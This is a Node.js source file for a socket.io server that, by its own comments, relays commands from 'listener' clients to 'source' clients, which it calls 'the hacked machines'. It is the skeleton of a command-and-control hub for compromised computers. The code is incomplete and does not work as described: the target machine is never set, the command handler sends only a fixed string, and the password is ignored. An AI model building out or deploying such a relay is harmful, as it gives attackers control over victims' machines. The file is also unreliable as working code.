require('dotenv').config()
const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);
const PORT = process.env.PORT || 3000;

app.use(express.static("public"));

// List of Sources
const socketList = [];

// Sources are the hacked machines
// Listeners are the clients
io.on('connection', function (socket) {
    let socketID = null;
    let connectedSource = null;
    let socketRoom = null;
    function updatedSocketList() {
        io.emit("socketList", socketList);
    }

    // Listener send command to Source
    socket.on('command', function (data) {
        if (socketRoom != "listener" || connectedSource == null) {
            return;
        }
        socket.to(connectedSource).emit("Sus!");
    });

    socket.on("joinRoom", (role, name, password) => {
        if (!role || !name || name.includes("-")) {
            console.log("Failed Connection");
            return;
        }
        socketID = socket.id + "-" + name;
        if (role === "source") {
            socketRoom = role;
            console.log(`Socket ${socketID} joined as a source.`);
            socketList.push(socketID);
        } else if (role === "listener") {
            socketRoom = role;
            console.log(`Socket ${socketID} joined as a listener.`);
        } else {
            console.log("Improper Role");
            return;
        }
        updatedSocketList();
    });

    socket.on("disconnect", () => {
        console.log(`User disconnected: ${socketID}`);
        if (socketRoom != "source") {
            return;
        }
        let index = socketList.indexOf(socketID);
        if (index == -1) {
            console.log("Source doesn't exist, disconnect.");
            return;
        }
        socketList.splice(index, 1);
        updatedSocketList();
    });
});

server.listen(PORT, () => {
    console.log(`Listening on: http://localhost:${PORT}`);
});